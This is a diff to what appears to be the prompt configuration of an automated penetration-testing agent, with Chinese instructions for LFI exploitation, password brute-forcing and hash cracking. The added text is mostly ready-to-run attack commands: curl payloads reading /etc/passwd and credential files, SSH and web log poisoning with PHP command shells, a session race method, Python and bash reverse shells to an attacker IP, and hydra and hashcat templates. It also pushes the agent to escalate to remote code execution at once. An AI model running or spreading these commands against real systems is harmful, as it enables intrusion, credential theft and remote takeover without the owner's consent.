@@ -339,73 +339,103 @@ LFI（本地文件包含）测试：
     "lfi_rce": {
         "description": "LFI本地文件包含与RCE远程命令执行利用",
         "manual": """
-⚠️ LFI→RCE 完整利用链 ⚠️
+⚠️ LFI→RCE 完整利用链（按成功概率排序）⚠️
 
 ════════════════════════════════════════════════
 步骤1 - 确认LFI漏洞：
 ════════════════════════════════════════════════
-发现包含参数的PHP文件时（如 ?file= ?page= ?image= ?path= ?include=）：
-  curl "http://<target>/page.php?file=/etc/passwd"
-  curl "http://<target>/page.php?file=../../../../etc/passwd"
+发现PHP文件带参数时（如 ?file= ?page= ?image= ?path= ?include=）：
+  ⚠️ 必须查看HTML源码确认参数名，不要猜测！
+  curl "http://<target>/page.php?<参数名>=/etc/passwd"
+  curl "http://<target>/page.php?<参数名>=../../../../etc/passwd"
 
-如果能读取到 passwd 内容，LFI确认。
+如果能读取到passwd内容，LFI确认。立即进入步骤2-6。
 
 ════════════════════════════════════════════════
-步骤2 - PHP Filter读源码（base64编码）：
+步骤2 - 用PHP filter读源码（base64编码）：
 ════════════════════════════════════════════════
-  curl "http://<target>/page.php?file=php://filter/convert.base64-encode/resource=page.php"
+  curl "http://<target>/page.php?<参数名>=php://filter/convert.base64-encode/resource=<文件>"
   → 返回base64编码的PHP源码，用 base64 -d 解码
 
 ════════════════════════════════════════════════
 步骤3 - 读取敏感文件（按优先级）：
 ════════════════════════════════════════════════
   /etc/passwd                          → 确认用户名
-  /etc/shadow                          → 密码哈希（需root）
-  /etc/nginx/.htpasswd                 → nginx认证密码
+  /etc/shadow                          → 密码哈希（需root权限，通常读不到）
+  /etc/nginx/.htpasswd                 → nginx认证密码（常见目标！）
   /etc/nginx/sites-enabled/default     → nginx虚拟主机配置
   /etc/nginx/nginx.conf                → nginx全局配置
   /var/www/html/config.php             → 数据库凭据
   /var/www/html/wp-config.php          → WordPress数据库凭据
   /proc/self/environ                   → 环境变量（可能包含路径）
-  /var/log/auth.log                    → SSH认证日志（用于日志投毒）
 
 ════════════════════════════════════════════════
-步骤4 - SSH日志投毒（最关键！）：
+步骤4 - LFI→RCE方法（按优先级排序！）：
 ════════════════════════════════════════════════
-当目标开放SSH端口时，向auth.log注入PHP代码：
-  ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
-  → 这会在 /var/log/auth.log 中写入PHP代码
+⚠️ 不要停留在文件读取，确认LFI后必须尝试RCE！
 
-然后通过LFI包含日志文件执行命令：
-  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=id"
-  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=whoami"
-  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=ls+-la+/"
+方法A - SSH日志投毒（优先级最高！）：
+  前提：目标开放SSH端口
+  步骤：
+  1) 注入PHP代码到SSH认证日志：
+     ssh '<?php system($_GET["cmd"]); ?>'@<target> -p <ssh_port>
+  2) 通过LFI包含日志文件执行命令：
+     curl "http://<target>/vuln.php?<参数名>=/var/log/auth.log&cmd=id"
+  3) 如果auth.log路径不对，尝试：
+     /var/log/auth.log
+     /var/log/secure
+     /var/log/syslog
+
+方法B - PHP Session Upload Progress竞态条件（非常可靠！）：
+  前提：PHP session.auto_start=On 或可设置PHPSESSID cookie
+  步骤（使用python脚本最可靠）：
+  1) 同时发送两个请求：
+     - 线程1：POST上传文件，设置PHP_SESSION_UPLOAD_PROGRESS为PHP代码
+     - 线程2：包含/var/lib/php/sessions/sess_<session_id>
+  2) 竞态条件：在session文件被清理前包含它
+  3) 经验：cookie设置为PHPSESSID=rce_payload，session文件路径为
+     /var/lib/php/sessions/sess_rce_payload
+
+方法C - Apache/Nginx日志包含：
+  前提：日志文件可读
+  步骤：
+  1) Apache：向日志注入PHP代码
+     curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/"
+     或用python发送包含PHP代码的原始HTTP请求
+  2) 包含日志文件：
+     curl "http://<target>/vuln.php?<参数名>=/var/log/apache2/access.log&cmd=id"
+     curl "http://<target>/vuln.php?<参数名>=/var/log/apache2/error.log&cmd=id"
+     curl "http://<target>/vuln.php?<参数名>=/var/log/nginx/access.log&cmd=id"
+
+方法D - /proc/self/environ包含：
+  前提：User-Agent可控且environ可读
+  curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/vuln.php?<参数名>=/proc/self/environ&cmd=id"
+
+⚠️ 注意：php://input和data://可能被php.ini禁用（allow_url_include=Off），优先使用以上方法
 
 ════════════════════════════════════════════════
-步骤5 - 反弹Shell：
+步骤5 - 获取RCE后执行命令和反弹Shell：
 ════════════════════════════════════════════════
-在攻击机上监听：nc -lvnp 4444
-通过LFI+日志投毒执行反弹shell（URL编码）：
-  curl "http://<target>/vuln.php?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'"
+确认RCE后（如uid=33(www-data)），立即尝试：
 
-════════════════════════════════════════════════
-步骤6 - 其他LFI→RCE方法（如果SSH日志投毒不可用）：
-════════════════════════════════════════════════
-PHP Session包含：
-  curl "http://<target>/vuln.php?file=/var/lib/php/sessions/sess_<session_id>"
+反弹Shell（在攻击机先开监听 nc -lvnp 4444）：
+  方法1 - Python反弹Shell（最稳定）：
+  &cmd=python3+-c+'import+socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<attacker_ip>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
 
-Apache日志包含：
-  curl "http://<target>/vuln.php?file=/var/log/apache2/access.log"
+  方法2 - Bash反弹Shell：
+  &cmd=bash+-c+'bash+-i+>%26+/dev/tcp/<attacker_ip>/4444+0>%261'
 
-/proc/self/environ包含：
-  curl -H "User-Agent: <?php system($_GET['cmd']); ?>" "http://<target>/vuln.php?file=/proc/self/environ&cmd=id"
+⚠️ 如果LFI返回的内容被phpinfo页面污染（大量CSS/HTML），提取命令输出：
+  用python脚本执行竞态条件，将命令输出重定向到临时文件，再用LFI读取临时文件
 
 ════════════════════════════════════════════════
 绝对禁止：
 ════════════════════════════════════════════════
-❌ 发现LFI后不要停留在探测阶段 — 立即读取敏感文件
-❌ 不要只测试不同参数名（?file= ?page=）— 看 HTML 源码确认参数名
-❌ 如果php://filter返回空，尝试不同路径格式
+❌ 发现LFI后不要停留在探测阶段 — 立即读取敏感文件并尝试RCE
+❌ 不要只测试不同参数名（?file= ?page=）— 查看HTML源码确认参数名
+❌ 如果php://filter返回空，说明路径可能不对，变换路径格式再试
+❌ 不要在哈希破解上耗费时间 — LFI→RCE可以直接获取Shell，不需要密码
+❌ 不要只尝试一种RCE方法 — 如果方法A不成功，立即尝试方法B/C/D
 """,
         "return_format": {
             "type": "json",
@@ -653,29 +683,30 @@ Apache日志包含：
 ⛔ 任何超过2000条的字典作为第一步
 
 ════════════════════════════════════════════════
-唯一允许的命令模板（直接复制使用）：
+分阶段爆破策略：
 ════════════════════════════════════════════════
-HTTP基础认证爆破（端口8888等）：
-  hydra -l admin -P /usr/share/wordlists/fasttrack.txt <target> http-get / -s <port>
-  hydra -l tomato -P /usr/share/wordlists/fasttrack.txt <target> http-get / -s <port>
+阶段1 - 快速弱口令尝试（几秒~1分钟）：
+  使用 fasttrack.txt（约260条），覆盖最常见密码
+
+阶段2 - 中等字典（1~3分钟）：
+  使用 best1050.txt，仅在阶段1失败后使用
+
+阶段3 - 定制字典（1分钟内）：
+  根据目标信息（主机名、域名、用户名、CMS、页面关键词）生成：
+  echo -e "目标关键词\n常见变体\n数字组合" > /tmp/target_words.txt
+  例如：目标名为myapp → myapp, MyApp, myapp123, myapp!, admin, root
+
+════════════════════════════════════════════════
+命令模板（直接使用）：
+════════════════════════════════════════════════
+HTTP基础认证爆破：
+  hydra -l <用户名> -P /usr/share/wordlists/fasttrack.txt <target> http-get / -s <port>
 
 SSH爆破：
-  hydra -l root -P /usr/share/wordlists/fasttrack.txt <target> ssh -p <port>
-  hydra -l tomato -P /usr/share/wordlists/fasttrack.txt <target> ssh -p <port>
+  hydra -l <用户名> -P /usr/share/wordlists/fasttrack.txt <target> ssh -s <port>
 
 FTP爆破：
-  hydra -l admin -P /usr/share/wordlists/fasttrack.txt <target> ftp
-
-如果第一阶段失败，第二阶段：
-  hydra -l admin -P /usr/share/wordlists/best1050.txt <target> http-get / -s <port>
-
-════════════════════════════════════════════════
-利用目标主题生成定制字典：
-════════════════════════════════════════════════
-如果目标名称是Tomato，生成定制字典：
-  echo -e "tomato\\npotato\\nketchup\\ntomatoes\\nPotato\\nTomato" > /tmp/target_words.txt
-  hydra -l admin -P /tmp/target_words.txt <target> http-get / -s <port>
-  hydra -l tomato -P /tmp/target_words.txt <target> http-get / -s <port>
+  hydra -l <用户名> -P /usr/share/wordlists/fasttrack.txt <target> ftp
 
 ════════════════════════════════════════════════
 绝对禁止：
@@ -685,6 +716,7 @@ FTP爆破：
 ❌ 禁止用 & 后台运行多条hydra（会卡死整个流程）
 ❌ 禁止不指定端口 -s <port>（HTTP非标准端口必须指定）
 ❌ 禁止超时后继续尝试更大的字典（应该换策略）
+❌ 如果fasttrack和best1050都失败，说明密码不常见，改用漏洞利用路径
 """,
         "return_format": {
             "type": "json",
@@ -744,37 +776,41 @@ FTP爆破：
 ════════════════════════════════════════════════
 分阶段破解策略：
 ════════════════════════════════════════════════
+阶段0 - openssl在线验证（最快，几秒）：
+  对已知格式的哈希（如APR1），用openssl逐个验证目标相关密码：
+  openssl passwd -apr1 -salt <salt> '<密码>' 
+  如果结果匹配哈希值，密码破解成功
+
 阶段1 - 快速破解（几秒~1分钟）：
+  pkill hashcat 2>/dev/null
   echo '<hash>' > /tmp/hash.txt
-  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt
+  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt --force
 
-阶段2 - 中等字典（1~5分钟）：
-  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/best1050.txt
+阶段2 - 定制字典（1分钟内）：
+  从目标信息提取关键词生成字典（主机名、域名、用户名、CMS名、页面关键词）：
+  echo -e "<关键词1>\\n<关键词2>\\n<常见变体>" > /tmp/target_words.txt
+  cat /usr/share/wordlists/fasttrack.txt /tmp/target_words.txt | sort -u > /tmp/combined.txt
+  hashcat -m <mode> /tmp/hash.txt /tmp/combined.txt --force
 
-阶段3 - 规则破解（基于阶段1的字典+规则变换）：
-  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule
+阶段3 - 规则破解（基于小字典+规则变换）：
+  hashcat -m <mode> /tmp/hash.txt /usr/share/wordlists/fasttrack.txt -r /usr/share/hashcat/rules/best64.rule --force
 
 ════════════════════════════════════════════════
-Apache APR1-MD5 示例（.htpasswd常见格式）：
+⚠️ 重要：哈希破解不是唯一路径！
 ════════════════════════════════════════════════
-  echo 'nginx:$apr1$azDw/Iwv$E7rIlqjeiX9Sx9.sMCcAZ0' > /tmp/hash.txt
-  hashcat -m 1600 /tmp/hash.txt /usr/share/wordlists/fasttrack.txt
+如果三个阶段都失败，不要用rockyou.txt，改为：
+1. 利用LFI/漏洞读取更多配置文件获取明文密码
+2. 利用LFI→RCE直接获取Shell（不需要密码）
+3. 寻找其他服务的凭据（数据库配置、SSH密钥等）
 
 ════════════════════════════════════════════════
 绝对禁止：
 ════════════════════════════════════════════════
 ❌ 禁止使用 rockyou.txt（会超时卡死）
 ❌ 禁止不指定 -m 参数（必须指定hash类型）
-❌ 禁止超时后继续用更大的字典（应该换策略）
-
-利用目标主题生成定制字典：
-如果目标名称是Tomato，生成定制字典：
-  echo -e "tomato\\npotato\\nketchup\\nTomato\\nPotato" > /tmp/target_words.txt
-  hashcat -m 1600 /tmp/hash.txt /tmp/target_words.txt
-
-同时用目标相关词+fasttrack组合：
-  cat /usr/share/wordlists/fasttrack.txt /tmp/target_words.txt | sort -u > /tmp/combined.txt
-  hashcat -m 1600 /tmp/hash.txt /tmp/combined.txt
+❌ 禁止用 nohup 或 & 后台运行hashcat（会卡死）
+❌ 禁止超时后继续用更大的字典（应该换攻击路径）
+❌ 执行hashcat前必须先 pkill hashcat 清除残留进程
 """,
         "return_format": {
             "type": "json",
